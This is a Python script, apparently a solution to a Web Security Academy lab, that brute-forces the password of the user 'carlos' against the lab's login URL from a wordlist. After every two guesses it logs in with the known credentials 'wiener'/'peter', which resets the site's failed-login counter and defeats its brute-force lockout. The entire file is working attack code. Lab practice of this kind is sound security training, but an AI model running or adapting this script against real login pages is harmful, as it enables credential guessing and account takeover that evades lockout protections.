import requests

url = 'https://0af400d7045a41f682ea7ea1000f006e.web-security-academy.net/login'

with open('../wordlists/burp_passwords.txt', 'r') as file:
    passwords = file.readlines()

# Remove any trailing newline characters from the passwords
passwords = [password.strip() for password in passwords if password.strip()]

index = 0
total_passwords = len(passwords)

while index < total_passwords:
    if index < total_passwords:
        password1 = passwords[index]
        index += 1
    else:
        break

    if index < total_passwords:
        password2 = passwords[index]
        index += 1
    else:
        password2 = None

    response1 = requests.post(url, data={'username': 'carlos', 'password': password1})
    print(f"Attempting password '{password1}' for 'carlos': {response1.status_code}")

    if 'Incorrect password' not in response1.text:
        print(f"Successful password for 'carlos': {password1}")
        break

    if password2:
        response2 = requests.post(url, data={'username': 'carlos', 'password': password2})
        print(f"Attempting password '{password2}' for 'carlos': {response2.status_code}")

        if 'Incorrect password' not in response2.text:
            print(f"Successful password for 'carlos': {password2}")
            break

    response3 = requests.post(url, data={'username': 'wiener', 'password': 'peter'})
